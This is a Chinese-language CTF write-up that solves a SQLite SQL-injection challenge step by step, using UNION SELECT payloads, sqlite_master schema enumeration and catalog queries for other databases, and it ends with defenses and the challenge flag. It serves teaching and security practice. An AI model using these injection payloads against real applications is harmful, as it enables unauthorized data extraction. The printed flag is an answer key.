# ✅ Web-49 解題說明 — 欄離難捨

## 題目描述
這是一個專注於「資料庫結構探勘 (Schema Recon)」的關卡。本題已知網頁查詢固定為 2 個欄位，也確定後端是 SQLite 資料庫。但難點在於，機密 Flag 被藏在一個檔名充滿亂碼的未知資料表裡面，欄位名稱也無從得知。駭客必須利用 SQLite 的系統目錄 `sqlite_master` 找出正確的表名與欄位名，才能成功奪旗。

## 難度
★★☆☆☆（2星）

## 種類
WEB

## 建議工具
- 瀏覽器網址列或開發者工具（F12 → Console）
- 記事本或終端機（組合 SQL Payload）

## 解題步驟

### 步驟一：尋找破綻 (Find the Injection Point)

**動作：** 在輸入框中輸入單引號 `'`

**背後原理：** - 正常的 SQL 語句：`WHERE sid = '輸入值'`
- 輸入單引號後變成：`WHERE sid = '''`
- 引號不配對會導致 SQL 語法錯誤

**觀察重點：** 畫面出現紅色的「Database Error」訊息，證明網頁沒有過濾輸入，存在 SQL Injection 漏洞。

---

### 步驟二：尋找回顯點 (Test for Reflection)

根據題目情報，我們已經知道欄位數量固定為 **2 欄**。

**動作：** 輸入一個不存在的學號並接上包含 2 個欄位的 UNION 查詢：

```sql
nonexistent' UNION SELECT '測試1', '測試2' --
```

**觀察重點：** 畫面成功印出了 `SID: 測試1 - Name: 測試2`。這證明我們成功控制了網頁的輸出，這兩個位置是我們的注入破口。

---

### 步驟三：打探資料庫結構 (Database Reconnaissance)

因為我們不知道隱藏的資料表名稱，必須去查閱 SQLite 的「系統目錄」。在 SQLite 中，有一個內建目錄叫做 `sqlite_master`，存放了所有資料表的建表語法 (`sql`)。

**動作：** 利用剛剛找到的 2 個欄位破口，把 `sqlite_master` 裡面的資料印出來：

```sql
nonexistent' UNION SELECT type, sql FROM sqlite_master --
```

**觀察重點：** 畫面會印出資料庫中所有的建表指令。請仔細觀察，你會在其中發現一行看起來非常可疑的語法（表名帶有亂碼）：
```sql
CREATE TABLE secret_vault_8a9b (id INTEGER PRIMARY KEY, hidden_flag_val TEXT)
```

**結論：** 我們成功挖出了未知資訊！
- 目標資料表：`secret_vault_8a9b`
- 目標欄位：`hidden_flag_val`

---

### 步驟四：奪旗 (Capture The Flag)

知道了精確的表名與欄位名後，就可以把它們帶入 UNION 查詢中。

**最終奪旗動作：** ```sql
nonexistent' UNION SELECT id, hidden_flag_val FROM secret_vault_8a9b --
```

**觀察重點：** 畫面成功印出機密資訊，格式包含 `flag{L3v3l_2_m4st3r_0f_sch3m4}`。

---

## 其他知識

### 不同資料庫的系統表查詢方法

探勘資料庫結構是 SQL 注入的必經之路，不同資料庫有不同的目錄：

- **SQLite：**
  - 系統表：`sqlite_master`
  - 查詢語法：`SELECT type, sql FROM sqlite_master WHERE type='table'`
- **MySQL / MariaDB / MSSQL：**
  - 系統目錄：`information_schema`
  - 查詢語法 (表名)：`SELECT TABLE_NAME FROM information_schema.TABLES`
  - 查詢語法 (欄位名)：`SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME='表名'`
- **PostgreSQL：**
  - 系統目錄：`pg_tables`, `information_schema`
  - 查詢語法：`SELECT tablename FROM pg_tables`

### 防禦方法

- **使用 Prepared Statements：** 將 SQL 語法與資料分離，是最有效的防禦方式。
- **最小權限原則：** 網頁應用程式連接資料庫的帳戶，不應該擁有查詢系統目錄 (`sqlite_master` 或 `information_schema`) 的權限，只需賦予特定業務表格的讀寫權限即可。
- **白名單過濾：** 若欄位名稱需要動態帶入，務必使用白名單進行嚴格限制。

---

## 驗證與常見卡點

- **驗證方式：** 最終輸出應符合 `flag{...}` 格式。
- **常見卡點：** 忘記加註解符號 `--`。
- **常見卡點：** 在查閱 `sqlite_master` 時，沒有抓對正確的欄位名稱（例如誤填成 `TEXT` 或是 `id`，沒有挑到真正的 `hidden_flag_val`）。

## 學習重點

- **系統目錄的危險性：** 只要攻擊者具備查閱系統表的權限，不論開發者把資料表名稱藏得多隱密、名稱取得多像亂碼，都能被駭客一眼看穿。
- **由未知到已知：** 體驗真實滲透測試中的 Recon 過程，了解如何利用內建功能獲取環境情報。

## Flag
`flag{L3v3l_2_m4st3r_0f_sch3m4}`